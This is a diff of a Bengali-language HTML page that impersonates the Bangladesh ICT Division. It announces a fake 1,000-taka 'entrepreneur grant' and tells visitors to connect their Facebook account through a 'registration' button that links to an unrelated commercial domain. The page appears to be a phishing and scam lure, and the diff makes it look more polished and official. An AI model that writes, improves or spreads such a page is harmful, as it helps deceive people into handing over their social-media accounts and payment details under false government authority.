@@ -3,144 +3,442 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>সরকারি অনুদান ২০২৫</title>
+    <title>সরকারি অনুদান ২০২৬ | ICT বিভাগ</title>
     <style>
-        /* দ্রুত লোডিংয়ের জন্য সিস্টেম ফন্ট ব্যবহার */
-        body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background-color: #f0f2f5;
+        /* সিস্টেম ফন্ট ব্যবহার - দ্রুত লোডিং */
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #f0f9ff 0%, #e6f7ef 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
-        }
-        .mobile-frame {
-            max-width: 400px;
-            width: 100%;
-            background: white;
-            min-height: 100vh;
-        }
-        .header {
-            background-color: #006a4e;
-            color: white;
-            padding: 15px;
-            text-align: center;
-            border-bottom: 4px solid #f42a41;
-        }
-        /* SVG লোগো: নেটওয়ার্ক ছাড়াই লোড হবে */
-        .gov-seal {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 5px;
-        }
-        .content {
-            padding: 15px;
-            text-align: center;
-        }
-        .alert-box {
-            background: #fff3cd;
-            color: #856404;
-            padding: 10px;
-            font-size: 13px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            font-weight: bold;
-            border: 1px solid #ffeeba;
-        }
-        .amount-card {
-            background: #1d976c;
-            color: white;
+            align-items: center;
             padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
         }
-        .amount-card h1 { margin: 5px 0; font-size: 32px; }
-        .text-info {
-            text-align: left;
+        
+        .mobile-frame {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 106, 78, 0.15);
+            position: relative;
+        }
+        
+        /* হেডার সেকশন */
+        .header {
+            background: linear-gradient(to right, #006a4e, #008c6a);
+            color: white;
+            padding: 24px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -30%;
+            left: -10%;
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 50%;
+        }
+        
+        .gov-seal {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 12px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .header-title {
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 4px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .header-subtitle {
+            font-size: 13px;
+            opacity: 0.9;
+            position: relative;
+            z-index: 2;
+        }
+        
+        /* কন্টেন্ট সেকশন */
+        .content {
+            padding: 24px;
+        }
+        
+        .alert-box {
+            background: linear-gradient(to right, #fff8e6, #fff3cd);
+            color: #856404;
+            padding: 14px 16px;
             font-size: 14px;
-            color: #444;
-            background: #f8f9fa;
-            padding: 12px;
-            border-radius: 8px;
-            border-left: 4px solid #006a4e;
+            border-radius: 12px;
             margin-bottom: 20px;
+            font-weight: 600;
+            border-left: 5px solid #ffc107;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
+        
+        .alert-box::before {
+            content: "⚠";
+            font-size: 18px;
+        }
+        
+        .page-title {
+            font-size: 22px;
+            color: #006a4e;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: 700;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        .page-title::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(to right, #f42a41, #ff7b00);
+            border-radius: 3px;
+        }
+        
+        /* অ্যামাউন্ট কার্ড */
+        .amount-card {
+            background: linear-gradient(135deg, #1d976c 0%, #2bbd8e 100%);
+            color: white;
+            padding: 28px 20px;
+            border-radius: 18px;
+            margin-bottom: 28px;
+            text-align: center;
+            box-shadow: 0 10px 20px rgba(29, 151, 108, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .amount-card::before {
+            content: "";
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .amount-card::after {
+            content: "";
+            position: absolute;
+            bottom: -30px;
+            left: -30px;
+            width: 100px;
+            height: 100px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 50%;
+        }
+        
+        .amount-label {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+            display: block;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .amount {
+            font-size: 42px;
+            font-weight: 800;
+            margin: 10px 0;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            letter-spacing: 1px;
+        }
+        
+        .amount-currency {
+            font-size: 24px;
+            font-weight: 600;
+            position: relative;
+            top: -5px;
+        }
+        
+        /* তথ্য বাক্স */
+        .info-box {
+            background: #f8fafc;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+            border: 1px solid #e2e8f0;
+            position: relative;
+        }
+        
+        .info-title {
+            color: #006a4e;
+            font-size: 16px;
+            margin-bottom: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .info-title::before {
+            content: "📋";
+            font-size: 18px;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: #4a5568;
+            line-height: 1.7;
+        }
+        
+        /* রেজিস্ট্রেশন বক্স */
         .reg-box {
-            border: 1px solid #ddd;
-            padding: 15px;
-            border-radius: 10px;
+            background: white;
+            border-radius: 18px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.1);
+            border: 1px solid #e2e8f0;
         }
-        .fb-text {
-            color: #1877f2;
-            font-weight: bold;
-            font-size: 14px;
-            margin-bottom: 10px;
+        
+        .fb-verification {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 10px;
+            color: #1877f2;
+            font-weight: 700;
+            font-size: 15px;
+            margin-bottom: 20px;
+            padding: 12px;
+            background: rgba(24, 119, 242, 0.05);
+            border-radius: 10px;
         }
+        
+        .fb-icon {
+            width: 24px;
+            height: 24px;
+        }
+        
         .reg-btn {
             display: block;
-            background: #28a745;
+            background: linear-gradient(to right, #28a745, #20c997);
             color: white;
             text-decoration: none;
-            padding: 14px;
-            border-radius: 5px;
+            padding: 18px;
+            border-radius: 12px;
             font-size: 18px;
-            font-weight: bold;
+            font-weight: 700;
+            text-align: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 15px rgba(40, 167, 69, 0.3);
+            position: relative;
+            overflow: hidden;
         }
+        
+        .reg-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.4);
+        }
+        
+        .reg-btn:active {
+            transform: translateY(0);
+        }
+        
+        .reg-note {
+            font-size: 11px;
+            color: #718096;
+            text-align: center;
+            margin-top: 12px;
+            line-height: 1.5;
+        }
+        
+        /* ফুটার */
         .footer {
             margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #718096;
+            text-align: center;
+            line-height: 1.7;
+        }
+        
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .payment-method {
+            background: #f1f5f9;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+            color: #475569;
             font-size: 11px;
-            color: #777;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+            font-size: 11px;
+            opacity: 0.8;
+        }
+        
+        /* রেসপন্সিভ */
+        @media (max-width: 480px) {
+            .mobile-frame {
+                border-radius: 20px;
+            }
+            
+            .header {
+                padding: 20px 15px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .amount {
+                font-size: 36px;
+            }
+        }
+        
+        /* অ্যানিমেশন */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .content > * {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        .amount-card {
+            animation-delay: 0.1s;
+        }
+        
+        .info-box {
+            animation-delay: 0.2s;
+        }
+        
+        .reg-box {
+            animation-delay: 0.3s;
         }
     </style>
 </head>
 <body>
-
-<div class="mobile-frame">
-    <div class="header">
-        <svg class="gov-seal" viewBox="0 0 100 100">
-            <circle cx="50" cy="50" r="48" fill="#006a4e"/>
-            <circle cx="50" cy="50" r="35" fill="#f42a41"/>
-            <path d="M50 20 L55 35 L70 35 L58 45 L62 60 L50 50 L38 60 L42 45 L30 35 L45 35 Z" fill="#f42a41"/>
-        </svg>
-        <div style="font-weight: bold; font-size: 14px;">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</div>
-        <div style="font-size: 11px;">তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ</div>
-    </div>
-
-    <div class="content">
-        <div class="alert-box">তহবিল বরাদ্দ </div>
+    <div class="mobile-frame">
+        <div class="header">
+            <svg class="gov-seal" viewBox="0 0 100 100">
+                <circle cx="50" cy="50" r="48" fill="#006a4e"/>
+                <circle cx="50" cy="50" r="35" fill="#f42a41"/>
+                <path d="M50 20 L55 35 L70 35 L58 45 L62 60 L50 50 L38 60 L42 45 L30 35 L45 35 Z" fill="white"/>
+            </svg>
+            <div class="header-title">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</div>
+            <div class="header-subtitle">তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ</div>
+        </div>
         
-        <h2 style="font-size: 18px; color: #333;">অনলাইন উদ্যোক্তা সহায়তা ২০২৫</h2>
-
-        <div class="amount-card">
-            <span style="font-size: 12px;">আপনার জন্য বরাদ্দকৃত অর্থ</span>
-            <h1>৳ ৫০০.০০</h1>
-        </div>
-
-        <div class="text-info">
-            <b>রেজিস্ট্রেশন পদ্ধতি:</b> সরকারি ডাটাবেজের সাথে আপনার তথ্য যাচাই করতে নিচের বাটনে ক্লিক করে আপনার <b>Facebook ID</b> কানেক্ট করুন। ভেরিফিকেশন সফল হলে বিকাশ, নগদ, রকেটে ও উপায় এর মাধ্যমে টাকা উত্তোলন করতে পারবেন ।
-        </div>
-
-        <div class="reg-box">
-            <div class="fb-text">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                ফেসবুক ভেরিফিকেশন প্রয়োজন
+        <div class="content">
+            <div class="alert-box">তহবিল বরাদ্দ: আপনার আবেদন নির্বাচিত হয়েছে</div>
+            
+            <h2 class="page-title">অনলাইন উদ্যোক্তা সহায়তা ২০২৬</h2>
+            
+            <div class="amount-card">
+                <span class="amount-label">আপনার জন্য বরাদ্দকৃত অর্থ</span>
+                <div class="amount"><span class="amount-currency">৳</span> ১,০০০</div>
+                <span style="font-size: 13px; opacity: 0.9;">প্রাপ্তির তারিখ: ৩১ জানুয়ারি, ২০২৫</span>
             </div>
             
-            <a href="https://peopleonbench.in/M285cjh0MVk0SjU2Mnk=" class="reg-btn">রেজিস্ট্রেশন করুন</a>
+            <div class="info-box">
+                <div class="info-title">রেজিস্ট্রেশন পদ্ধতি</div>
+                <div class="info-text">
+                    সরকারি ডাটাবেজের সাথে আপনার তথ্য যাচাই করতে নিচের বাটনে ক্লিক করে আপনার <b>Facebook ID</b> কানেক্ট করুন। ভেরিফিকেশন সফল হলে বিকাশ, নগদ, রকেট ও উপায় পেমেন্ট গেটওয়ের মাধ্যমে টাকা উত্তোলন করতে পারবেন। প্রক্রিয়াটি সম্পূর্ণ করতে ৩-৫ মিনিট সময় লাগতে পারে।
+                </div>
+            </div>
             
-            <p style="font-size: 10px; color: #888; margin-top: 8px;">(রেজিস্ট্রেশনে ক্লিক করলে আপনার ফেসবুক প্রোফাইল অটো-লিঙ্ক হবে)</p>
-        </div>
-
-        <div class="footer">
-            বিকাশ | নগদ | রকেট পেমেন্ট গেটওয়ে অনুমোদিত<br>
-            © ২০২৫ আইসিটি বিভাগ। সর্বস্বত্ব সংরক্ষিত।
+            <div class="reg-box">
+                <div class="fb-verification">
+                    <svg class="fb-icon" viewBox="0 0 24 24" fill="#1877f2">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                    ফেসবুক ভেরিফিকেশন প্রয়োজন
+                </div>
+                
+                <a href="https://orraprintpack.com/M0Q5Ujg0MTI0ZDV1Mjc=" class="reg-btn">রেজিস্ট্রেশন করুন</a>
+                
+                <p class="reg-note">রেজিস্ট্রেশনে ক্লিক করলে আপনার ফেসবুক প্রোফাইল স্বয়ংক্রিয়ভাবে যুক্ত হবে এবং সরকারি ডাটাবেজ যাচাই শুরু হবে।</p>
+            </div>
+            
+            <div class="footer">
+                <div class="payment-methods">
+                    <span class="payment-method">বিকাশ</span>
+                    <span class="payment-method">নগদ</span>
+                    <span class="payment-method">রকেট</span>
+                    <span class="payment-method">উপায়</span>
+                </div>
+                <div>সকল পেমেন্ট গেটওয়ে অনুমোদিত</div>
+                <div class="copyright">© ২০২৬ তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ। সর্বস্বত্ব সংরক্ষিত।</div>
+            </div>
         </div>
     </div>
-</div>
-
+    
+    <script>
+        // সাবমিট বাটনে ক্লিক এফেক্ট
+        document.querySelector('.reg-btn').addEventListener('click', function(e) {
+            // লোডিং ইফেক্ট যোগ করা যায় ভবিষ্যতে
+            console.log('রেজিস্ট্রেশন প্রক্রিয়া শুরু করা হয়েছে...');
+        });
+        
+        // পেজ লোড হলে সাবটাইটেল অ্যানিমেশন
+        document.addEventListener('DOMContentLoaded', function() {
+            const subtitle = document.querySelector('.header-subtitle');
+            subtitle.style.opacity = '0';
+            subtitle.style.transform = 'translateY(10px)';
+            
+            setTimeout(() => {
+                subtitle.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+                subtitle.style.opacity = '1';
+                subtitle.style.transform = 'translateY(0)';
+            }, 300);
+        });
+    </script>
 </body>
 </html>
